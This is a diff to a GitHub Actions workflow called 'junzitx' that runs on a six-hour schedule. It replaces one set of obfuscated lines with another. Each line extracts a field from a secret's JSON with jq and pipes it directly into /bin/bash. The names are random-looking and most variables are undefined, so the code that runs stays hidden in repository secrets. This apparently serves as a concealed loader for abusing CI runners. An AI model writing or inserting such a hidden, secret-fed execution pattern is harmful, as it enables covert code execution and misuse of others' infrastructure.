@@ -3,8 +3,7 @@ name: junzitx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 4/6 * * *'
-
+    - cron: '26 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,27 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: junzitx
         env:
-          izp1209: ${{ secrets.izp1209 }}
+          eg8: ${{ secrets.eg8 }}
         run: |
-          echo $izp1209 | jq -r .ubm9780 | /bin/bash
-          echo $xxowq93 | jq -r .f73 | /bin/bash
-          echo $ufcy32460 | jq -r .bg82 | /bin/bash
-          echo $ipf5209 | jq -r .wta29727 | /bin/bash
-          echo $wjg440 | jq -r .ipul54482 | /bin/bash
-          echo $op99695 | jq -r .v2038 | /bin/bash
-          echo $bv37 | jq -r .foofx49 | /bin/bash
-          echo $tzm442 | jq -r .pt3231 | /bin/bash
-          echo $tcxcv9455 | jq -r .gzx274 | /bin/bash
-          echo $gvi70 | jq -r .dvo39 | /bin/bash
-          echo $fp7021 | jq -r .hh14 | /bin/bash
-          echo $nyv8 | jq -r .pbrr4257 | /bin/bash
-          echo $k837 | jq -r .y1 | /bin/bash
-          echo $isut32 | jq -r .yqsdk188 | /bin/bash
-          echo $o807 | jq -r .ywev75386 | /bin/bash
-          echo $gktwv84 | jq -r .bpu10 | /bin/bash
-          echo $y5606 | jq -r .x8 | /bin/bash
-          echo $ow073 | jq -r .ezj784 | /bin/bash
-          echo $q03005 | jq -r .bqqrx4999 | /bin/bash
-          echo $g7 | jq -r .d07320 | /bin/bash
-          echo $ysa81798 | jq -r .h18 | /bin/bash
+          echo $eg8 | jq -r .x2 | /bin/bash
+          echo $sn216 | jq -r .b8 | /bin/bash
+          echo $ll974 | jq -r .hk42 | /bin/bash
+          echo $v1111 | jq -r .wdvse0204 | /bin/bash
+          echo $rh20 | jq -r .chlz96421 | /bin/bash
+          echo $o412 | jq -r .e27393 | /bin/bash
+          echo $j6 | jq -r .afib1 | /bin/bash
+          echo $givln7 | jq -r .efbh9 | /bin/bash
 
